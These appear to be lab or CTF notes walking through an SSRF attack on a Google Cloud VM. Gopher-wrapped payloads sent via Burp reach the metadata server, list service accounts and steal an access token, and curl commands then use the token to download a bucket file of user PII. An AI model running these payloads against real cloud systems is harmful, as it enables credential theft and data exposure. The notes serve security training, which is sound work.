
```nmap -Pt 35.226.245.121```

```whois 35.226.245.121```

bucket: `gigantic-retail`

A common way of hosting a website on Google Cloud is to use a VM instance. Every Google Cloud virtual machine (VM) maintains its [metadata](https://cloud.google.com/compute/docs/metadata/overview) on a dedicated metadata server. Compute metadata can contain sensitive information such as credentials and this API is accessible to VMs without requiring authorization.
Checking the [documentation](https://cloud.google.com/appengine/docs/legacy/standard/java/accessing-instance-metadata) we see a metadata endpoint that allows for retrieving the GCP project ID (the unit of separation in Google Cloud is a project). 
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
```
![[Pasted image 20240524034113.png]]

This [blog](https://blog.codydmartin.com/gcp-cloud-function-abuse/), that contains the following SSRF payload that encapsulates an HTTP request within a Gopher URL. 
Gopher is a TCP/IP application layer protocol designed for distributing, searching, and retrieving documents over the Internet. It was developed in the early 1990s and predates the World Wide Web, presenting information in a hierarchical, text-based format. Although it has largely been supplanted by the HTTP protocol and web browsers, many libraries (such as libcurl) support an overly permissive number of protocols, including gopher. 
```
gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/service-accounts/<snip>-compute@developer.gserviceaccount.com/token%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a
```

1. **Protocol and Target**: `gopher://metadata.google.internal:80/` - This part of the payload specifies that the Gopher protocol is being used to make a request to `metadata.google.internal` on port 80. As mentioned, `metadata.google.internal` is a special domain used internally by Google Cloud services to provide metadata information to VM instances.
2. **Crafted Request**:
    - `GET /computeMetadata/v1/instance/service-accounts/<service-account>/token` - This is a GET request to the Google Cloud metadata service API, requesting an access token associated with a service account. We need to find out what service account is associated with the VM.
    - `%2520HTTP%252f%2531%252e%2531` - This is an encoded form of " HTTP/1.1"
    - `%250AHost:%2520metadata.google.internal` - This is an encoded header specifying the host.
    - `%250AAccept:%2520%252a%252f%252a` - Encoded header for the Accept field, indicating that any media type is acceptable in response.
    - `%250aMetadata-Flavor:%2520Google` - Importantly this sets the header that is required to access the metadata service.

Using BurpSuit for intercepting the request after clicking `Fetch Image` .
select `Send to Repeater` . Then replace the existing URL value with the payload below that requests the URL `/computeMetadata/v1/instance/service-accounts/` to list the service accounts.

payload: ```
```
gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/service-accounts/%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a
```

  After obtaining the custom service account named `bucketviewer@gr-proj-1.iam.gserviceaccount.com/token` we will ad it to the payload `Send` again.
  
```
gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/service-accounts/bucketviewer@gr-proj-1.iam.gserviceaccount.com/token%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a
```

The response is HTML encoded so we can select the entire token, right-click it and select `Convert selection` > `HTML` > `HTML-decode` .

We might think to use the token with the Google Cloud CLI (gcloud) but `gcloud` typically relies on a service account key file (in JSON format) or user account credentials to authenticate, instead of an access token. 
We will set the `GOOGLE_ACCESS_TOKEN` environment variable, and make an authenticated request to GCP API endpoints using cURL!
```
export GOOGLE_ACCESS_TOKEN=<token>
```

```
curl -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://www.googleapis.com/storage/v1/b/gigantic-retail/o"
```
![[Pasted image 20240524035318.png]]

The `mediaLink` field provides a direct link to download the object. Downloading the file with `curl` we see some exposed PII.
```
curl -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://www.googleapis.com/download/storage/v1/b/gigantic-retail/o/userdata%2Fuser_data.csv?generation=1703877006716190&alt=media"
```


